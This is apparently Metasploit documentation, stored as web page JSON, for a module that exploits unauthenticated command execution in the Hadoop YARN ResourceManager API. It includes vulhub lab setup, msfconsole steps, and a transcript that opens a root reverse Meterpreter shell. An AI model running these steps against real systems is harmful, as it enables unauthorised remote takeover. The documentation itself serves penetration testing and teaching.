{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/hadoop_unauth_exec","result":{"data":{"moduleMetadataJson":{"id":"554c651b-8faa-502c-8849-0563aa689296","name":"Hadoop YARN ResourceManager Unauthenticated Command Execution","fullname":"exploit/linux/http/hadoop_unauth_exec","description":"This module exploits an unauthenticated command execution vulnerability in Apache Hadoop through ResourceManager REST API.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/hadoop_unauth_exec","documentationSlug":"/modules/documentation/exploit/linux/http/hadoop_unauth_exec","referencesSlug":"/modules/references/exploit/linux/http/hadoop_unauth_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits an unauthenticated command execution vulnerability in Apache Hadoop through ResourceManager REST API.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><strong>Vulnerable Application Link</strong></p>\n<ul>\n<li>docker</li>\n</ul>\n<p><a href=\"https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn</a></p>\n<h3 id=\"vulnerable-application-installation-setup\" style=\"position:relative;\"><a href=\"#vulnerable-application-installation-setup\" aria-label=\"vulnerable application installation setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application Installation Setup.</h3>\n<p>Change dictory to <code class=\"language-text\">vulhub/hadoop/unauthorized-yarn</code>, and run <code class=\"language-text\">docker-compose up -d</code></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/hadoop_unauth_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost x.x.x.x</code></li>\n<li>Do: <code class=\"language-text\">set rport 8088</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n</ol>\n<p><code class=\"language-text\">[+] 192.168.77.141:8088 The target is vulnerable.</code></p>\n<ol start=\"7\">\n<li>Do: <code class=\"language-text\">set payload linux/x86/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/hadoop_unauth_exec\nmsf5 exploit(linux/http/hadoop_unauth_exec) &gt; show options\n\nModule options (exploit/linux/http/hadoop_unauth_exec):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST                     yes       The target address\n   RPORT    8088             yes       The target port (TCP)\n   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT  8080             yes       The local port to listen on.\n   SSL      false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                   no        The URI to use for this exploit (default is random)\n   VHOST                     no        HTTP server virtual host\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(linux/http/hadoop_unauth_exec) &gt; set rhost 192.168.77.141\nrhost =&gt; 192.168.77.141\nmsf5 exploit(linux/http/hadoop_unauth_exec) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf5 exploit(linux/http/hadoop_unauth_exec) &gt; show options\n\nModule options (exploit/linux/http/hadoop_unauth_exec):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST    192.168.77.141   yes       The target address\n   RPORT    8088             yes       The target port (TCP)\n   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT  8080             yes       The local port to listen on.\n   SSL      false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                   no        The URI to use for this exploit (default is random)\n   VHOST                     no        HTTP server virtual host\n\n\nPayload options (linux/x86/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(linux/http/hadoop_unauth_exec) &gt; set lhost 192.168.77.141\nlhost =&gt; 192.168.77.141\nmsf5 exploit(linux/http/hadoop_unauth_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.77.141:4444\n[*] Sending Command\n[*] Command Stager progress - 100.00% done (763/763 bytes)\n[*] Sending stage (853256 bytes) to 172.20.0.3\n[*] Meterpreter session 1 opened (192.168.77.141:4444 -&gt; 172.20.0.3:34138) at 2018-05-15 03:21:17 -0400\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"554c651b-8faa-502c-8849-0563aa689296"}}}